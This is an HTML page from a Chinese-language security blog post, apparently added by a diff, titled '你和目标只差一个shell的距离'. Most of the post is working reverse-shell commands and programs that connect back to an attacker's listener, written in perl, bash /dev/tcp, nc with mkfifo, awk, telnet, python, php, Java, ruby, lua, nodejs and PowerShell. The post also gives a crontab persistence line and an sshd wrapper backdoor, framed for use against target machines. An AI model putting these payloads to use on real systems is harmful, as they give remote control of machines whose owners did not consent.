@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="你和目标只差一个shell的距离"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>你和目标只差一个shell的距离 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/27/revese-shell/">
+                你和目标只差一个shell的距离
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/shell/">shell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
+<p>0x02 大致环境<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win7</span>          192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.128</span></div><div class="line"><span class="selector-tag">centos6</span><span class="selector-class">.8</span>     192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.129</span></div><div class="line"><span class="selector-tag">win2008R2</span>     192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.131</span></div><div class="line"><span class="selector-tag">kali</span>          192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.147</span></div></pre></td></tr></table></figure></p>
+<p>0x03 关于linux平台下弹shell的一些方式</p>
+<p>利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp 53</div><div class="line"># perl -<span class="keyword">e</span> '<span class="keyword">use</span> Socket;<span class="variable">$i</span>=<span class="string">"192.168.1.128"</span>;<span class="variable">$p</span>=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">"tcp"</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);exec(<span class="string">"/bin/bash -i"</span>);&#125;;'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br><a id="more"></a><br>利用系统特殊设备文件/dev/tcp[当然,有这种特性的文件并不止这一个],语句的意思其实很简单,通俗点儿讲就是把bash的数据全部通多/dev/tcp建立的socket发过去,以此来达到反弹shell的效果<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp <span class="number">80</span></div><div class="line"># <span class="regexp">/bin/</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.1.128/</span><span class="number">80</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_dev_tcp.png" alt="&#39;&#39;"><br></p>
+<p>利用sshd来反弹shell,ln -f的意思就是把原有的数据清空,整体语句的意思通俗点儿讲,就是把sshd绑定在本地的8080端口上,这样当别人从8080这个端口进来的时候就相当于直接进到本机的sshd中,-o就是去掉第一次ssh连接的那个密钥对提示,像这种正向连,有个非常不好的地方,防火墙只要阻断你这个端口的数据通信就基本废掉了</p>
+<p>第一种方式:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp | grep <span class="string">"8080"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp | grep <span class="string">"8080"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> ssh root@192.168.1.129 -p 8080      一定要注意在自己本地机器上用这个端口去连</span></div><div class="line"><span class="meta">#</span><span class="bash"> pkill su</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_shell1.png" alt="&#39;&#39;"><br><img src="/img/linux_sshd_shell2.png" alt="&#39;&#39;"><br><img src="/img/linux_sshd_shell3.png" alt="&#39;&#39;"><br></p>
+<p>第二种方式,注意这里的socat连接的端口,默认是13377端口,关于socat,这里就不多做介绍了,一个高级端口转发工具,当然,并不只是转发那么简单,想必小伙伴们应该也用的比较多了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /usr/sbin/</span></div><div class="line"><span class="meta">#</span><span class="bash"> mv sshd ../bin/</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'#!/usr/bin/perl'</span> &gt;sshd</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);'</span> &gt;&gt;sshd</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'exec &#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,'</span> &gt;&gt;sshd</span></div><div class="line"><span class="meta">#</span><span class="bash"> chmod u+x sshd</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/sshd restart</span></div><div class="line"><span class="meta">#</span><span class="bash"> socat STDIO TCP4:192.168.1.129:22,sourceport=13377</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_wrapper.png" alt="&#39;&#39;"><br></p>
+<p>利用最古老的nc来反弹,但默认正常发行版中默认带的那个nc都是阉割版的,即没有-e选项,也就意味着不能直接用它反弹shell,好在强大的linux为我们提供了一个建立管道的工具mkfifo和bash本身的各种管道特性,我们就可以利这种方式,把bash的数据通过管道反弹走</p>
+<p>普通nc反弹<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp <span class="number">8080</span></div><div class="line"># rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>f;cat <span class="regexp">/tmp/</span>f|<span class="regexp">/bin/</span>sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">192.168</span>.<span class="number">1.128</span> <span class="number">8080</span> &gt;<span class="regexp">/tmp/</span>f</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_bash_mkfifo.png" alt="&#39;&#39;"><br></p>
+<p>加密版的netcat = ‘cryptcat’,可以设置连接密码,用-k指定下即可,kali默认自带,如果是目标机器,可能需要你自己手工动装一下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># cryptcat -vv -l -p <span class="number">25</span> -k sec</div><div class="line"># cryptcat -vv -l -p <span class="number">80</span> -k sec</div><div class="line"># cryptcat <span class="number">192.168</span><span class="number">.12</span><span class="number">.141</span> <span class="number">80</span> -k sec|cmd.exe|cryptcat <span class="number">192.168</span><span class="number">.12</span><span class="number">.141</span> <span class="number">25</span> -k sec</div></pre></td></tr></table></figure></p>
+<p>利用awk或gawk来反弹shell,awk就不用多说了吧,linux文本处理三剑客的老大,语句的意思也非常简单,就是循环发socket<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># awk '<span class="type">BEGIN</span>&#123;s=<span class="string">"/inet/tcp/0/192.168.1.128/8080"</span>;<span class="keyword">for</span>(;s|&amp;getline <span class="built_in">c</span>;close(<span class="built_in">c</span>))<span class="keyword">while</span>(<span class="built_in">c</span>|getline)<span class="built_in">print</span>|&amp;s;close(s)&#125;'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_awk.png" alt="&#39;&#39;"><br></p>
+<p>利用系统自带的telnet客户端来反弹shell,一般运维默认都会把它装上<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">第一种</div><div class="line"><span class="symbol">C:</span>\&gt;nc -vlp <span class="number">1080</span>   命令结果显示窗口</div><div class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">8080</span>   命令传输窗口</div><div class="line"># telnet <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.128</span> <span class="number">8080</span> | /bin/bash | telnet <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.128</span> <span class="number">1080</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_telnet_two.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">第二种</div><div class="line">C:\&gt;nc -lvp 8080</div><div class="line"><span class="meta">#</span><span class="bash"> mknod <span class="built_in">test</span> p &amp;&amp; telnet 192.168.1.128  8080 0&lt;<span class="built_in">test</span> | /bin/bash 1&gt;<span class="built_in">test</span></span></div></pre></td></tr></table></figure>
+<p><img src="/img/linux_telnet_mknod.png" alt="&#39;&#39;"><br></p>
+<p>利用py反弹shell,就像perl在绝大多数发行版上都已经自带,但默认是2.6.6,不过,对我们来说,足矣,当然啦,这里只是用最简单的py的socket来反弹一个shell,关于其它的更高级的py reverse_shell 这里就不说了<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp <span class="number">8080</span></div><div class="line"># python -c <span class="symbol">'import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"192.168.1.128"</span>,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>]);'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_py.png" alt="&#39;&#39;"><br></p>
+<p>利用crontab定时反弹shell,很容被发现,临时用用还行,至于用什么反弹,随意,perl,py都行,你喜欢,用完以后记得立马删掉<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">C:<span class="symbol">\&gt;</span>nc -lvp 8080</div><div class="line"># (crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="symbol">\"</span>192.168.1.128<span class="symbol">\"</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="symbol">\"</span>/bin/sh<span class="symbol">\"</span>,<span class="symbol">\"</span>-i<span class="symbol">\"</span>]);'<span class="symbol">\n</span>")|crontab -</div><div class="line"># crontab -e</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_croantab.png" alt="&#39;&#39;"><br></p>
+<p>利用php的socket来反弹,对于php的网站,也许我们可以利用上,也是很多php大马里默认的反弹方式,当然,除了php脚本,别的web后端脚本其实都可以被利用,比如,jsp…<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp 8080</div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/php/bin/php -r <span class="string">'$sock=fsockopen("192.168.1.128",8080);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_php.png" alt="&#39;&#39;"><br></p>
+<p>如果目标机器上有java环境,那就更好了,直接用java来弹,效果一般还是非常好的,而且java的免杀效果也很不错哦,把下面的代码打成jar包就可以了,记得打之前改下里面要反弹到的ip和端口<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="string">C:</span>\&gt;nc -lvp <span class="number">8080</span></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> &#123;</span></div><div class="line">    <span class="comment">/**</span></div><div class="line">    * <span class="doctag">@param</span> args</div><div class="line">    * <span class="doctag">@throws</span> Exception </div><div class="line">    */</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Runtime r = Runtime.getRuntime();</div><div class="line">        String cmd[]= &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.1.128/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</div><div class="line">        Process p = r.exec(cmd);</div><div class="line">        p.waitFor();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>利用ruby的socket来反弹shell:<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="type">C</span>:\&gt;nc -lvp <span class="number">8080</span></div><div class="line"># ruby -rsocket -e 'exit <span class="keyword">if</span> fork;<span class="built_in">c</span>=<span class="type">TCPSocket</span>.new(<span class="string">"192.168.1.128"</span>,<span class="string">"8080"</span>);<span class="keyword">while</span>(cmd=<span class="built_in">c</span>.gets);<span class="type">IO</span>.popen(cmd,<span class="string">"r"</span>)&#123;|io|<span class="built_in">c</span>.<span class="built_in">print</span> io.read&#125;end'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_ruby_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用lua的socket来反弹shell:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">c:\nc -lvp 8080</div><div class="line"><span class="meta">#</span><span class="bash"> apt-get install lua50 -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> apt-get install luarocks -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> luarocks install luasocket</span></div><div class="line"><span class="meta">#</span><span class="bash"> lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.1.128','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_lua_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用nodejs反弹shell:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp <span class="number">8080</span></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>),</div><div class="line">    cp = <span class="built_in">require</span>(<span class="string">"child_process"</span>),</div><div class="line">    sh = cp.spawn(<span class="string">"/bin/sh"</span>, []);</div><div class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</div><div class="line">    client.connect(<span class="number">8080</span>, <span class="string">"10.17.26.64"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        client.pipe(sh.stdin);</div><div class="line">        sh.stdout.pipe(client);</div><div class="line">        sh.stderr.pipe(client);</div><div class="line">    &#125;);</div><div class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure></p>
+<p>c版的reverse_shell:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp 8080</div><div class="line"><span class="meta">#</span><span class="bash"> gcc c_revese_shell.c -o cshell</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./cshell 192.168.1.128 8080</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_c_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用gcc反弹shell:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">抱歉,自己在本地暂时还没成功,待续....</div></pre></td></tr></table></figure></p>
+<p>0x04 基于不同协议下的shell反弹方式</p>
+<p>利用icmp来反弹shell,需要你自己先编译下,会生成两个文件,一个服务端[ishd]一个客户端[ish],自己有兴趣可以拿wireshark看下,通常用来穿透高层防火墙<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># make linux</div><div class="line"># ./ishd -i <span class="number">6555</span> -t <span class="number">0</span> -p <span class="number">8080</span></div><div class="line"># ./ish -i <span class="number">6555</span> -t <span class="number">0</span> -p <span class="number">8080</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.129</span>[这里的ip可以换成域名]</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_icmp_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用udp来反弹shell<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">C</span>:\&gt;<span class="selector-tag">nc</span> <span class="selector-tag">-l</span> <span class="selector-tag">-p</span> 53 <span class="selector-tag">-u</span>     注意这里务必要用<span class="selector-tag">udp</span>的模式来接</div><div class="line"># <span class="selector-tag">python</span> <span class="selector-tag">udpshell</span><span class="selector-class">.py</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.128</span> 53 <span class="selector-tag">udp</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_udp_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用dns来反弹shell的方式,就不说了吧,详情可自行参考cobalt strike,那可能是现今最好的dns隧道学习样例</p>
+<p>0x05 关于win平台下的一些shell反弹方式</p>
+<p>除了上面这些可以通用的语言反弹shell之外,可能最重要的就是powershell了,当然啦,如果你说vbs更好,那我也没啥好说的了,毕竟自己平时遇到03以下的系统实在是太少了,可能以后也会越来越少,人总要向前看嘛<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">8080</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">记得到脚本里面去把要反弹到的ip和端口改一下,另外,可能是因为<span class="keyword">cmd</span><span class="bash">默认的字符集[gbk]所以才会乱码,如果是英文系统就不会了</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\mini-reverse.ps1'&#125;"</span></div></pre></td></tr></table></figure>
+<p><img src="/img/linux_mini_shell.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">同样要记得去把脚本里要反弹到的ip和端口改成你自己的,这个格式化输出写的确实不怎么好</div><div class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\minRev.ps1'&#125;"</span></span></div></pre></td></tr></table></figure>
+<p><img src="/img/linux_minrev_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用powercat来反弹shell,其实就是powershell版的netcat</p>
+<p>首先,在本机创建好powershell版的reverse shell的payload,编码处理的还是蛮不错的<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Set</span>-ExecutionPolicy Unrestricted</div><div class="line">PS <span class="keyword">C</span>:\&gt; cd .\powercat</div><div class="line">PS <span class="keyword">C</span>:\powercat&gt; <span class="keyword">Import</span>-<span class="keyword">Module</span> .\powercat.ps1</div><div class="line">PS <span class="keyword">C</span>:\powercat&gt; powercat -c <span class="number">192.168</span><span class="number">.1</span><span class="number">.128</span> -p <span class="number">8080</span> -e cmd -g &gt;&gt; payload.ps1</div><div class="line"><span class="keyword">C</span>:\&gt;nc -lvp <span class="number">8080</span></div></pre></td></tr></table></figure></p>
+<p>然后,把payload.ps1丢到目标机器上去执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\payload.ps1'&#125;"</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_poewrcat_shell.png" alt="&#39;&#39;"><br></p>
+<p>关于nishang及其它各种powershell工具包中的各种反弹shell的方式,篇幅限制,这里就不一一说了,大家有兴趣可以去关注我的博客[klionsec.github.io],里面很久之前应该写过,可能比较粗糙,大家先将就看吧,后续我会抽空把博客好好整理一下,有点儿乱……</p>
+<p>我知道,基于这种思路,可以衍生出来的方法还有非常非常的多,有兴趣咱们可以一起研究,不可否认的是,虽然只是一个简单的shell,但中间涉及到的东西依然是很值得学习的</p>
+<p>0x07 一一些小结<br>&nbsp;&nbsp;&nbsp;&nbsp;反弹的核心说白点其实就是和目标系统建立socket(如果中间[不管是正向还是反向]端口被防火墙阻断了,那你可能就只能选择复用或者直接走更底层的协议了,还是那句话,只是一个shell而已,方法已经有了,怎么在实战中按照自己的需求改进,可能才是你更需要思考的,另外,我们也看到,反弹的时候,进程会一直处于挂起状态,实际中放到后台跑就好了</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/reverse-shell/">#reverse shell</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
